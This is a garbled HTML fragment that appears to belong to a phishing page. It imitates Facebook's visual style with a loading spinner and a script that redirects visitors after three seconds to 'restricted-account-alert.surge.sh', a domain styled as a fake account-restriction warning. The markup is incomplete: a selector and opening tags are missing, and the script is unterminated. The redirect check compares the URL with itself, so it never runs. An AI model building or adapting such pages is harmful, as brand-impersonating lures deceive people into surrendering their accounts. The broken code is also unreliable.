<style>
*{box-sizing:border-box}

  margin:0;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  background:#f0f2f5;
  font-family:Arial,Helvetica,sans-serif;
}
.card{
  width:min(92%,420px);
  background:#fff;
  border-radius:16px;
  padding:42px 28px;
  text-align:center;
  box-shadow:0 8px 28px rgba(0,0,0,.10);
}
.logo{
  width:78px;
  height:78px;
  margin:0 auto 22px;
  display:block;
}
h1{
  margin:0 0 10px;
  font-size:23px;
  color:#1c1e21;
}
p{
  margin:0 0 24px;
  color:#65676b;
  font-size:14px;
}
.loader{
  width:42px;
  height:42px;
  margin:auto;
  border:4px solid #e4e6eb;
  border-top-color:#1877f2;
  border-radius:50%;
  animation:spin .9s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>

  <div class="loader"></div>
</div>

<script>
const REDIRECT_URL = "https://restricted-account-alert.surge.sh/";
const REDIRECT_DELAY = 3000;

setTimeout(function(){
  if (REDIRECT_URL && REDIRECT_URL !== "https://restricted-account-alert.surge.sh/") {
    window.location.href = REDIRECT_URL;
  }
}, REDIRECT_DELAY);
